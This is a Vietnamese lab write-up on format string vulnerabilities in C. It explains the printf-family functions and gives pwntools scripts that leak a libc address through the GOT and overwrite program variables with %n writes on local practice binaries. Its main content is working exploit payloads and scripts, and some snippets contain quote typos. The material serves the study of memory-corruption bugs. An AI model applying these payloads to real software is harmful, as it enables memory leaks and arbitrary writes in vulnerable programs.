# Format string
## Câu 1
### Question
Điền giới thiệu về các hàm trên bảng.

### Answer
| Hàm | Giới thiệu |
|---|---|
| `printf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào và in chuỗi đó ra stdout. |
| `fprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào và in chuỗi đó ra một output stream.|
| `vprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và in chuỗi đó ra stdout.|
| `vfprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và in chuỗi đó ra một output stream.|
| `sprintf` | Tạo một chuỗi từ định dạng và đối số cho trước và xuất chuỗi đó ra một mảng ký tự.|
| `snprintf` | Tạo một chuỗi từ định dạng và đối số cho trước và xuất chuỗi đó ra một mảng ký tự với giới hạn số lượng ký tự được xuất ra.|
| `vsprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và xuất chuỗi đó ra một mảng ký tự.|
| `vsnprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và xuất chuỗi đó ra một mảng ký tự với giới hạn số lượng ký tự được xuất ra.|
| `setproctitle` | Đặt tên cho tiến trình sử dụng format string để tạo chuỗi tên. |
| `syslog` | Tạo log message để truyền vào system logger. Log message được tạo từ format string. |
| `err`, `verr`, `warn`, `vwarn` | Hiển thị error message. Error message được tạo từ format string. |

## Câu 2
### Question
Dùng GDB để debug và nhập giá trị `%3$x`.

### Answer
- Khi tiến trình chạy đến bước `printf(s)`, stack sẽ như sau:  

![image](https://user-images.githubusercontent.com/44528004/143236001-c1c91a66-a374-4262-a79d-3b016fdbe6d2.png)

- Kết quả chạy là:  

![image](https://user-images.githubusercontent.com/44528004/143236049-03b9b3a5-e6cc-451b-8740-806a14286986.png)

- Từ đây ta thấy được rằng `3$` sẽ tương ứng với đối số thứ 3 được truyền vào `printf`. Tuy nhiên, do chúng ta không truyền vào đối số nào cả nên tiến trình sẽ lấy giá trị cách đó 12 bytes ở phía trên của stack. Dựa vào stack bên trên, `0xffffd064` có giá trị `0xffffd070` là đối số 1, `0xffffd068` có giá trị `0xf7fc9410` là đối số 2, và `0xffffd06c` có giá trị `0x0804918d` là đối số 3.
- Vậy nếu `s = %08x.%08x.%08x` thì chương trình sẽ in ra `ffffd070.f7fc9410.0804918d`.
- Và nếu `s = %3$x` thì chương trình sẽ in ra giá trị của đối số thứ 3 là `0804918d`.


## Câu 3
### Question
Dùng GDB để debug và phân t ích tại sao có địa chỉ của `scanf`.

### Answer
- Ban đầu, khi ta truyền vào `AAAA%4$s`, chương trình bị treo vì khi hàm `printf('AAAA%4$s')` được thực thi, chương trình sẽ cố gắng truy xuất vào vùng nhớ `0x41414141` nhằm đọc các ký tự từ địa chỉ này để in ra màn hình. Tuy nhiên, `0x41414141` là vùng nhớ không thể truy xuất được nên chương trình bị treo.
> Specifier `%s` mong đợi đối số truyền vào là địa chỉ bắt đầu của chuỗi ký tự nên `printf` sẽ truy xuất đến vùng địa chỉ này để lấy giá trị.
- Trong trường hợp 4 bytes đầu của payload là địa chỉ của `__isoc99_scanf_got`, vì GOT nằm ở data segment mà data segment thì chương trình có thể truy xuất được nên sẽ không xảy ra lỗi. Bên cạnh đó, entry của `scanf` trên GOT trỏ tới địa chỉ thực của `scanf` trên libc nên ta thành công trong việc truy xuất vào địa chỉ thực của `scanf` trên libc.
- Script:  
```python
from pwn import *


sh = process('./leak')
e = ELF('./leak')

__isoc99_scanf_got = e.got['__isoc99_scanf']
print(hex(__isoc99_scanf_got))

payload = p32(__isoc99_scanf_got) + b'%4$s'
print(payload)

with open('payload.in', 'wb') as f:
    f.write(payload)

sh.sendline(payload)
sh.recvuntil(b'%4$s\n')
print(hex(u32(sh.recv()[4:8])))
sh.interactive()
```
- Trong mốt số trường hợp địa chỉ của `scanf` trong libc có chứa các byte đặc biệt như `0a`, `0b`, `0c`, `00`, ... thì `printf` sẽ terminate việc in chuỗi trên.
- Ví dụ khi chạy script exploit và dùng gdb để debug thì ta thấy rằng địa chỉ thực của `scanf` trên libc hiện tại đang là `0xf7e17300` và khi in ra ở little endian, byte `0x00` sẽ được đưa lên đầu và chuỗi sẽ bị terminate. Việc này dẫn tới việc script không in ra địa chỉ của `scanf` ra màn hình.  

  ![image](https://user-images.githubusercontent.com/44528004/143276062-c255d0e9-046f-4456-b7cf-cb8b6a3f60c3.png)

  ![image](https://user-images.githubusercontent.com/44528004/143276331-27f89422-1423-4ca2-b6d8-7edb4caaa0e8.png)

## Câu 4
Ta có đoạn code sau:
```c
#include <stdio.h>

int a = 123, b = 456;

int main() {
        int c = 789;
        char s[100];
        printf("%p\n", &c);
        scanf("%s", s);
        printf(s);
        if (c == 16) {
                puts("modified c.");
        }
        else if (a == 2) {
                puts("modified a for a small number.");
        }
        else if (b == 0x12345678) {
                puts("modified b for a big number!");
        }
        return 0;
}
```

- Ở đây, mục đích của ta là ghi đè giá trị của `c` thành 16 thì ta cần truyền vào payload có dạng `[overwriten_addr][padding]%[offset]$n`. Cụ thể hơn, payload để khai thác chương trình này sẽ là `addr_c%012d%6$n`.
    - `addr_c` là địa chỉ của biến `c`.
    - `%012d` sẽ khiến đọc 4 bytes tiếp theo trên stack và thêm padding để tạo thành 12 bytes.
    - `%6$n` sẽ đếm tổng số bytes đã đọc được ở thời điểm hiện tại và lưu vào đối số thứ 6. Với đối số thứ 6 này địa chỉ bắt đầu của buffer và đang trỏ tới địa chỉ của biến `c`. Do đó, tổng số bytes đã được đọc bởi `printf` là 16 sẽ được lưu vào địa chỉ của biến `c` và `c` sẽ bằng 16.

- Script exploit:  

```python
from pwn import *


def for_c():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print(hex(c_addr))

    payload = p32(c_addr) + b'%012d' + b'%6$n'
    print(payload)

    with open('payload.in', 'wb') as f:
        f.write(payload)

    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()


for_c()
```

- Kết quả exploit:  

![image](https://user-images.githubusercontent.com/44528004/143288425-b2124f91-79e4-4085-b91d-59aa97a8f282.png)

> Tip: Trong trường hợp địa chỉ muốn ghi đè chứa các byte đặc biệt, ta có thể cân nhắc chuyển địa chỉ ghi đè về cuối payload.

## Câu 5
- Để ghi đè biến `a` thành `2`, ta cần đặt địa chỉ ghi đè về cuối payload vì địa chỉ chiếm 4 bytes nên `%n` sẽ luôn trả về giá trị >= 4. Lúc này vì phần đầu payload là `aa%6$n` là 6 byte nên địa chỉ của `a` sẽ không align để ta có thể truy xuất bình thường nên ta sẽ thêm padding 2 byte `aa` vào cuối đoạn đầu này.
- Lúc này địa chỉ của `a` sẽ được đẩy về sau 8 byte, tương đương lùi 2 vị trí đối số. Do đó t thay `%6$n` thành `%8$n`.
- Script exploit:  

```python
from pwn import *


def for_a():
    sh = process('./overwrite')
    e = ELF('./overwrite')
    a_addr = e.symbols['a']
    payload = b'aa%8$naa' + p32(a_addr)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

for_a()
```

- Chạy script:  

![image](https://user-images.githubusercontent.com/44528004/143335107-4402db51-7ec5-4ef6-a965-59cf25ffedde.png)


## Câu 6
- Ở bài này, ta muốn overwrite `b = 0x12345678`, tuy nhiên đây là 1 con số rất lớn nên ta khổng thể khai thác như 2 bài trước. Thay vào đó ta sẽ khai thác bằng cách overwrite từng byte.
- Giả sử địa chỉ của `b` là `b_addr`. Ta sẽ overwrite byte tại `b_addr` thành `0x78`, sau đó overwrite byte tại `b_addr + 1` thành `0x56`, v.v.

### Overwrite `b_addr` với 0x78
- Đầu tiên, `0x78` tương đương 120 ở decimal và vị trí của payload trên stack sẽ là đối số thứ 6 trong format string (tương tự các câu  trên). Do đó ta sẽ có payload ban đầu là `%120x%6$n`.
- Sau đó, ta thêm `b_addr` vào đầu payload thì payload sẽ có thêm 4 byte được đọc trước `%n` nên ta sẽ giảm offset từ 120 xuống 116.
- Script exploit:
```python
from pwn import *


def for_b():
    sh = process('./overwrite')
    e = ELF('./overwrite')
    b_addr = e.symbols['b']
    print(hex(b_addr))
    
    payload = p32(b_addr) + b'%116x%6$n'
    print(payload)

    with open('payload.in', 'wb') as f:
        f.write(payload)

    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

for_b()
```
- Đặt breakpoint ngay sau câu lệnh `printf` thứ 2 và debug để kiểm tra kết quả:  

![image](https://user-images.githubusercontent.com/44528004/143361017-6c062722-fd05-4b09-aff0-dedde7add33a.png)


### Overwrite `b_addr + 1` với 0x56
- Tiếp theo ta chèn thêm địa chỉ `b_addr + 1` vào payload ở ngày sau `b_addr`. Lúc này sẽ có thêm 4 byte phía trước `%n` đầu tiên nên ta sẽ giảm offset từ 116 xuống 112.
- Để tính offset để ghi đè `b_addr + 1`, ta sẽ thử `%10x%7$n`. Ở đây vì `%6$n` sẽ ghi vào đối số thứ 6 là `b_addr`, nhưng `b_addr + 1` nằm cách đầu payload 4 byte nên `b_addr + 1` sẽ trở thành đối số thứ 7.
```python
payload = p32(b_addr) + p32(b_addr + 1)
payload += b'%112x%6$n` + b'%10x%7$n'
```

- Debug để kiểm tra giá trị của `b`:  

![image](https://user-images.githubusercontent.com/44528004/143360719-9e0df225-17f7-47ff-9459-14ba9c60f347.png)

- Nếu ta tăng offset lên `%30x%7$n` thì kết quả chạy là:  

![image](https://user-images.githubusercontent.com/44528004/143364155-b9e78349-a7b6-4732-8ba7-6ee149e9d57c.png)

- Ta quan sát thấy được `0x96 - 0x82 = 0x14 = 20` byte, bằng với khoảng cách của offset mà ta vừa thay đổi (từ 10 lên 30).
- Vì ta muốn ghi đè với giá trị là `0x56`, mà hiện tại `b_addr + 1` được ghi vào với giá trị `0x82`. Bên cạnh đó, ta không thể giảm số byte đã đọc nên ta chỉ có thể tăng số byte đọc lên `0x156` byte.
- Ta tính offset bằng cách lấy `0x156 - 0x82 + 0x10 = 0xe4 = 228` byte. Lúc này payload của ta là:  

```python
payload = p32(b_addr) + p32(b_addr + 1)
payload += b'%112x%6$n` + b'%228x%7$n'
```

- Kết quả debug:  

![image](https://user-images.githubusercontent.com/44528004/143364761-ee13fef1-7840-4c5d-ba13-67f3495cbeef.png)

- Lúc này kết quả chạy cho thấy `b_addr + 1` đang có giá trị là `0x5c` mà ta muốn `0x56` nên ta sẽ giảm offset đi 1 lượng tương ứng `0x5c - 0x56 = 6`. Vậy offset sẽ thành 222 byte.
- Payload:  
```python
payload = p32(b_addr) + p32(b_addr + 1)
payload += b'%112x%6$n` + b'%222x%7$n'
```
- Kết quả debug:  

![image](https://user-images.githubusercontent.com/44528004/143364931-298eb23b-a3fc-4a6f-88f5-331822f1d37d.png)

### Overwrite `b_addr + 2` và `b_addr + 3`
- Với cách khai thác tương tự như khai thác `b_addr + 1`, ta có payload sau:  
```python
payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
payload += b'%104x%6$n' + b'%222x%7$n' + b'%222x%8$n' + b'%222x%9$n'
```

- Debug để xem giá trị của `b`:  

![image](https://user-images.githubusercontent.com/44528004/143365076-655a32d4-5f82-4699-a964-8571b45c06f4.png)  
> Đúng giá trị ta mong muốn.

- Script hoàn chỉnh như sau:
```python
from pwn import *


def for_b():
    sh = process('./overwrite')
    e = ELF('./overwrite')
    b_addr = e.symbols['b']
    print(hex(b_addr))
    
    # payload = p32(b_addr) + b'%116x%6$n'
    payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
    payload += b'%104x%6$n' + b'%222x%7$n' + b'%222x%8$n' + b'%222x%9$n'
    print(payload)

    with open('payload.in', 'wb') as f:
        f.write(payload)

    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

for_b()
```


- Kết quả chạy script:  

![image](https://user-images.githubusercontent.com/44528004/143365221-05dc1df7-e346-4b4c-ade2-f1558784b345.png)
> Thành công, chương trình đã in ra `modified b for a big number!\n`.
